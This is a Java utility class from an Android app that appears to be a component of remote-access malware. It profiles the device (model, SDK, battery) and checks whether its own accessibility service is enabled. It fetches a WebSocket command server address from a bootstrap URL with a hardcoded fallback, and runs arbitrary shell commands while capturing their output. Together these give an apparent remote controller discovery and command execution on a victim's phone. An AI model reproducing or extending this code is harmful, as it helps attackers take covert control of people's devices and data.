package com.aval.seg;

import android.content.Context;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public final class Util {

    public static String dev(Context c) {
        int bat = -1;
        try {
            BatteryManager bm = (BatteryManager) c.getSystemService(Context.BATTERY_SERVICE);
            bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Throwable ignored) {}
        return "\"m\":\"" + esc(Build.MANUFACTURER + " " + Build.MODEL) + "\",\"sdk\":" +
                Build.VERSION.SDK_INT + ",\"bat\":" + bat;
    }

    public static boolean accOn(Context c) {
        try {
            String s = Settings.Secure.getString(c.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return s != null && s.contains(c.getPackageName());
        } catch (Throwable t) { return false; }
    }

    public static String bootstrap(Context c) {
        try {
            HttpURLConnection h = (HttpURLConnection) new URL(Cfg.BOOTSTRAP).openConnection();
            h.setConnectTimeout(8000);
            h.setReadTimeout(8000);
            BufferedReader r = new BufferedReader(new InputStreamReader(h.getInputStream()));
            String l = r.readLine();
            r.close();
            if (l != null && (l.startsWith("ws://") || l.startsWith("wss://"))) return l.trim();
        } catch (Throwable ignored) {}
        return Cfg.FALLBACK;
    }

    public static String exec(String cmd) {
        StringBuilder out = new StringBuilder();
        try {
            Process p = new ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;
            while ((l = r.readLine()) != null) out.append(l).append('\n');
            p.waitFor();
        } catch (Throwable t) { out.append("err: ").append(t); }
        String s = out.toString();
        return s.length() > 6000 ? s.substring(0, 6000) : s;
    }

    public static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "");
    }
}
